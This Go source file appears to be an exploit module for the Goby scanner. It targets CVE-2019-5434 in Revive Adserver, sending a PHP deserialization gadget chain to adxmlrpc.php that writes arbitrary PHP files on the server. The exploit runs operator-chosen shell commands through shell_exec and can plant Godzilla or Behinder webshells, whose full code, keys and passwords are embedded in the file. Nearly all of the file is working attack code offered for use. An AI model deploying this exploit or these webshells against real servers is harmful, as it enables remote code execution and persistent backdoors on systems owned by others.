package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Revive Adserver adxmlrpc.php Remote Code Execution Vulnerability (CVE-2019-5434)",
    "Description": "<p>Revive Adserver is an open source advertising management system developed by the Revive Adserver team. The system provides functions such as advertising placement, advertising space management, and data statistics.</p><p>The delivery XML-RPC script in versions prior to Revive Adserver 4.2.0 has a code problem vulnerability, and an attacker can execute arbitrary code to obtain server permissions.</p>",
    "Product": "Revive-Adserver",
    "Homepage": "https://www.revive-adserver.com",
    "DisclosureDate": "2023-03-09",
    "Author": "h1ei1",
    "FofaQuery": "title=\"Revive Adserver\" || body=\"strPasswordMinLength\" || body=\"Welcome to Revive Adserver\"",
    "GobyQuery": "title=\"Revive Adserver\" || body=\"strPasswordMinLength\" || body=\"Welcome to Revive Adserver\"",
    "Level": "3",
    "Impact": "<p>The delivery XML-RPC script in versions prior to Revive Adserver 4.2.0 has a code problem vulnerability, and an attacker can execute arbitrary code to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.revive-adserver.com/security/revive-sa-2019-001/\">https://www.revive-adserver.com/security/revive-sa-2019-001/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,behinder,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php echo \"hello\"; ?>",
            "show": "webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2019-5434"
    ],
    "CNNVD": [
        "CNNVD-201905-132"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "Revive Adserver 广告管理系统 adxmlrpc.php 文件远程代码执行漏洞（CVE-2019-5434）",
            "Product": "Revive-Adserver",
            "Description": "<p>Revive Adserver是Revive Adserver团队的一套开源的广告管理系统。该系统提供广告投放、广告位管理、数据统计等功能。<br></p><p>Revive Adserver 4.2.0之前版本中delivery XML-RPC脚本存在代码问题漏洞，攻击者可执行任意代码获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://www.revive-adserver.com/security/revive-sa-2019-001/\">https://www.revive-adserver.com/security/revive-sa-2019-001/</a><br></p>",
            "Impact": "<p>Revive Adserver 4.2.0之前版本中delivery XML-RPC脚本存在代码问题漏洞，攻击者可执行任意代码获取服务器权限。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Revive Adserver adxmlrpc.php Remote Code Execution Vulnerability (CVE-2019-5434)",
            "Product": "Revive-Adserver",
            "Description": "<p>Revive Adserver is an open source advertising management system developed by the Revive Adserver team. The system provides functions such as advertising placement, advertising space management, and data statistics.<br></p><p>The delivery XML-RPC script in versions prior to Revive Adserver 4.2.0 has a code problem vulnerability, and an attacker can execute arbitrary code to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.revive-adserver.com/security/revive-sa-2019-001/\">https://www.revive-adserver.com/security/revive-sa-2019-001/</a><br></p>",
            "Impact": "<p>The delivery XML-RPC script in versions prior to Revive Adserver 4.2.0 has a code problem vulnerability, and an attacker can execute arbitrary code to obtain server permissions.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-19",
    "PocId": "10839"
}`
	base64EncodeGR5h01YF := func(input string) string {
		inputBytes := []byte(input)
		encodedString := base64.StdEncoding.EncodeToString(inputBytes)
		return encodedString
	}

	countSerializationLenGR5h01YF := func(input string) string {
		serLen := 26 + len(base64EncodeGR5h01YF(input))
		return strconv.Itoa(serLen)
	}

	countFileLenGR5h01YF := func(input string) string {
		fileLen := 42 + len(input)
		return strconv.Itoa(fileLen)
	}

	sendPayloadGR5h01YF := func(hostInfo *httpclient.FixUrl, filename, payload string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewPostRequestConfig("/adxmlrpc.php")
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadRequestConfig.Data = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <methodCall> <methodName>openads.spc</methodName> <params> <param> <value> <struct> <member> <name>remote_addr</name> <value>8.8.8.8</value> </member> <member> <name>cookies</name> <value> <array> </array> </value> </member> </struct> </value> </param> <param><value><string>a:1:{S:4:\"what\";O:11:\"Pdp\\Uri\\Url\":1:{S:17:\"\\00Pdp\\5CUri\\5CUrl\\00host\";O:21:\"League\\Flysystem\\File\":2:{S:7:\"\\00*\\00path\";S:" + countFileLenGR5h01YF(filename) + ":\"plugins/3rdPartyServers/ox3rdPartyServers/" + filename + "\";S:13:\"\\00*\\00filesystem\";O:21:\"League\\Flysystem\\File\":2:{S:7:\"\\00*\\00path\";S:" + countSerializationLenGR5h01YF(payload) + ":\"x://data:text/html;base64," + base64EncodeGR5h01YF(payload) + "\";S:13:\"\\00*\\00filesystem\";O:29:\"League\\Flysystem\\MountManager\":2:{S:14:\"\\00*\\00filesystems\";a:1:{S:1:\"x\";O:27:\"League\\Flysystem\\Filesystem\":2:{S:10:\"\\00*\\00adapter\";O:30:\"League\\Flysystem\\Adapter\\Local\":1:{S:13:\"\\00*\\00pathPrefix\";S:0:\"\";}S:9:\"\\00*\\00config\";O:23:\"League\\Flysystem\\Config\":1:{S:11:\"\\00*\\00settings\";a:1:{S:15:\"disable_asserts\";b:1;}}}}S:10:\"\\00*\\00plugins\";a:1:{S:10:\"__toString\";O:34:\"League\\Flysystem\\Plugin\\ForcedCopy\":0:{}}}}}}}</string></value></param> <param><value><string>0</string></value></param> <param></param> <param><value><boolean>1</boolean></value></param> <param><value><boolean>0</boolean></value></param> <param><value><boolean>1</boolean></value></param> </params> </methodCall>"
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	checkFilePayloadGR5h01YF := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		checkRequestConfig := httpclient.NewGetRequestConfig("/plugins/3rdPartyServers/ox3rdPartyServers/" + uri)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			respSendPoc, err := sendPayloadGR5h01YF(hostInfo, "adtech.class.php", "<?php echo \""+checkStr+"\"; ?>")
			if !(err == nil && respSendPoc != nil && respSendPoc.StatusCode == 200) {
				return false
			}
			respCheckPoc, err := checkFilePayloadGR5h01YF(hostInfo, "adtech.class.php")
			adtechFileContent := "<?php\n\n/*\n+---------------------------------------------------------------------------+\n| Revive Adserver                                                           |\n| http://www.revive-adserver.com                                            |\n|                                                                           |\n| Copyright: See the COPYRIGHT.txt file.                                    |\n| License: GPLv2 or later, see the LICENSE.txt file.                        |\n+---------------------------------------------------------------------------+\n*/\n\n/**\n * @package    MaxPlugins\n * @subpackage 3rdPartyServers\n * @author     Heiko Weber <heiko@wecos.de>\n */\n\nrequire_once LIB_PATH . '/Extension/3rdPartyServers/3rdPartyServers.php';\n\n/**\n *\n * 3rdPartyServer plugin. Allow for generating different banner html cache\n *\n * @static\n */\nclass Plugins_3rdPartyServers_ox3rdPartyServers_adtech extends Plugins_3rdPartyServers\n{\n\n    /**\n     * Return the name of plugin\n     *\n     * @return string\n     */\n    function getName()\n    {\n        return $this->translate('adtech');\n    }\n\n    /**\n     * Return plugin cache\n     *\n     * @return string\n     */\n    function getBannerCache($buffer, &$noScript)\n    {\n        $search  = array(\"/\\[timestamp\\]/i\", \"/(rdclick=)([^\\\";]*)/i\");\n        $replace = array(\"{timestamp}\",      \"$1{clickurl}\");\n\n        $buffer = preg_replace ($search, $replace, $buffer);\n        $noScript[0] = preg_replace($search[0], $replace[0], $noScript[0]);\n\n        return $buffer;\n    }\n\n}\n\n?>\n"
			sendPayloadGR5h01YF(hostInfo, "adtech.class.php", adtechFileContent) // 还原源文件
			return err == nil && respCheckPoc != nil && strings.Contains(respCheckPoc.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType != "cmd" && attackType != "webshell" {
				expResult.Success = false
				expResult.Output = "未知的攻击方式"
				return expResult
			}
			// 新创建一个文件，在该文件的基础上，进行一系列操作。(为了避免修改原文件）
			randFileName := goutils.RandomHexString(16) + ".php"
			payload := "<?php file_put_contents('" + randFileName + "', ''); ?>"
			resp, err := sendPayloadGR5h01YF(expResult.HostInfo, "adtech.class.php", payload)
			if err == nil && resp != nil && resp.StatusCode != 200 && !strings.Contains(resp.Utf8Html, "<name>what</name>") {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				respCheck, errCheck := checkFilePayloadGR5h01YF(expResult.HostInfo, "adtech.class.php")
				if respCheck != nil && respCheck.StatusCode != 200 {
					expResult.Success = false
					expResult.Output = errCheck.Error()
				}
				adtechFileContent := "<?php\n\n/*\n+---------------------------------------------------------------------------+\n| Revive Adserver                                                           |\n| http://www.revive-adserver.com                                            |\n|                                                                           |\n| Copyright: See the COPYRIGHT.txt file.                                    |\n| License: GPLv2 or later, see the LICENSE.txt file.                        |\n+---------------------------------------------------------------------------+\n*/\n\n/**\n * @package    MaxPlugins\n * @subpackage 3rdPartyServers\n * @author     Heiko Weber <heiko@wecos.de>\n */\n\nrequire_once LIB_PATH . '/Extension/3rdPartyServers/3rdPartyServers.php';\n\n/**\n *\n * 3rdPartyServer plugin. Allow for generating different banner html cache\n *\n * @static\n */\nclass Plugins_3rdPartyServers_ox3rdPartyServers_adtech extends Plugins_3rdPartyServers\n{\n\n    /**\n     * Return the name of plugin\n     *\n     * @return string\n     */\n    function getName()\n    {\n        return $this->translate('adtech');\n    }\n\n    /**\n     * Return plugin cache\n     *\n     * @return string\n     */\n    function getBannerCache($buffer, &$noScript)\n    {\n        $search  = array(\"/\\[timestamp\\]/i\", \"/(rdclick=)([^\\\";]*)/i\");\n        $replace = array(\"{timestamp}\",      \"$1{clickurl}\");\n\n        $buffer = preg_replace ($search, $replace, $buffer);\n        $noScript[0] = preg_replace($search[0], $replace[0], $noScript[0]);\n\n        return $buffer;\n    }\n\n}\n\n?>\n"
				sendPayloadGR5h01YF(expResult.HostInfo, "adtech.class.php", adtechFileContent)
			}
			// 执行exp
			if attackType == "cmd" {
				cmd := goutils.B2S(stepLogs.Params["cmd"])
				payload = "<?php echo shell_exec(\"" + cmd + "\"); ?>"
				respCmd, err := sendPayloadGR5h01YF(expResult.HostInfo, randFileName, payload)
				if err == nil && respCmd != nil && respCmd.StatusCode == 200 {
					respCmdCheck, err := checkFilePayloadGR5h01YF(expResult.HostInfo, randFileName)
					if err == nil && respCmdCheck != nil && respCmdCheck.StatusCode == 200 {
						expResult.Success = true
						expResult.Output = respCmdCheck.Utf8Html
					}
				}
			} else if attackType == "webshell" {
				webshell := goutils.B2S(stepLogs.Params["webshell"])
				content := goutils.B2S(stepLogs.Params["content"])
				if webshell == "godzilla" {
					content = "<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if(isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if(isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if(strpos($payload,\"getBasicsInfo\")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if(strpos($data,\"getBasicsInfo\")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}?>"
				} else if webshell == "behinder" {
					content = "<?php @error_reporting(0);session_start();$key=\"e45e329feb5d925b\";$_SESSION['k']=$key;session_write_close();$post=file_get_contents(\"php://input\");if(!extension_loaded('openssl')){$t=\"base64_\".\"decode\";$post=$t($post.\"\");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,\"AES128\",$key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p.\"\");}}@call_user_func(new C(),$params);?>"
				}
				respWebshell, err := sendPayloadGR5h01YF(expResult.HostInfo, randFileName, content)
				if !(err == nil && respWebshell != nil && respWebshell.StatusCode == 200) {
					return expResult
				}
				respCheckShell, err := checkFilePayloadGR5h01YF(expResult.HostInfo, randFileName)
				if !(err == nil && respCheckShell != nil && respCheckShell.StatusCode == 200) {
					return expResult
				}
				expResult.Success = true
				if webshell == "custom" {
					expResult.Output = "File URL: " + expResult.HostInfo.FixedHostInfo + "/plugins/3rdPartyServers/ox3rdPartyServers/" + randFileName + "\n"
					return expResult
				}
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/plugins/3rdPartyServers/ox3rdPartyServers/" + randFileName + "\n"
				if webshell == "godzilla" {
					expResult.Output += "密码: pass 密钥：key 加密器：PHP_XOR_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				} else if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				}
				expResult.Output += "Webshell type: php"
			}

			return expResult
		},
	))
}
